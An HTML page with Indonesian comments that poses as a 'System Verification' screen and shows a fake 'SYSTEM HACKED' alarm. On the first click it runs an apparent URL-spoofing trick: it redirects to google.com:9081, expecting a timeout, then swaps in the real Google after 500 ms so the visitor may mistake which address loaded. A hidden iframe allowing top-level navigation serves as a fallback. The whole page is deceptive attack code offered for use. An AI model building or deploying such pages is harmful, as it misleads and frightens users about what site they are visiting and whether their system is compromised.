<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000; color: #0f0; font-family: monospace;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
  }
  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #0f0; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(0,255,0,0.5); }
  h2 { animation: blink 0.2s infinite; }
  @keyframes blink { 50% { opacity: 0.2; } }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 120px; overflow-y: auto; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>☢️ SYSTEM HACKED ☢️</h2>
  <p>Klik di mana saja untuk memverifikasi.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI
  // ============================================
  var GOOGLE_DELAY = "http://google.com:9081"; // Akan timeout
  var GOOGLE_REAL = "https://www.google.com"; // Target akhir (jika user mengira ini google asli)

  // ============================================
  // TRIGGER DELAY SPOOFING (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>EXECUTING...</h2>
      <p>Memulai Delay Spoofing...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Delay Spoofing...");

    // ============================================
    // A. REDIRECT KE PORT 9081 (MEMICU DELAY)
    // ============================================
    try {
      log("[+] Redirect ke google.com:9081 (Delay)...");
      // Jika ini berhasil, browser akan menunggu (timeout)
      window.location.href = GOOGLE_DELAY;
    } catch(e) {}

    // ============================================
    // B. TIMPA DENGAN GOOGLE ASLI (SPOOFING)
    // ============================================
    // Setelah 500ms, timpa redirect ke Google asli.
    // User mungkin mengira ini google.com:9081 yang berhasil.
    setTimeout(function() {
      log("[+] Menimpa dengan Google Asli...");
      try {
        window.location.href = GOOGLE_REAL;
      } catch(e) {}
    }, 500);

    // ============================================
    // C. FALLBACK IFRAME (JIKA REDIRECT GAGAL)
    // ============================================
    setTimeout(function() {
      log("[+] Mengirim Delay via Iframe...");
      try {
        var iframe = document.createElement("iframe");
        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe.style.display = "none";
        iframe.src = GOOGLE_DELAY;
        document.getElementById("launcher-container").appendChild(iframe);
      } catch(e) {}
    }, 1000);

  }, { once: true });

})();
</script>
</body>
</html>
